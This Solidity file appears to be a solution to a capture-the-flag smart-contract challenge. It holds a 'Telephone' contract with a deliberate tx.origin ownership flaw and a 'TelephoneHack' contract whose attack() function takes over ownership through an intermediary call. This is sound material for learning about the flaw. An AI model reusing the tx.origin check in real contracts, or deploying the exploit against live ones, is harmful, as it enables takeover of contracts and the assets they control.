// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneHack {
    Telephone private victim;

    constructor(address _victim) {
        victim = Telephone(_victim);
    }

    function attack() public {
        victim.changeOwner(msg.sender);
    }
}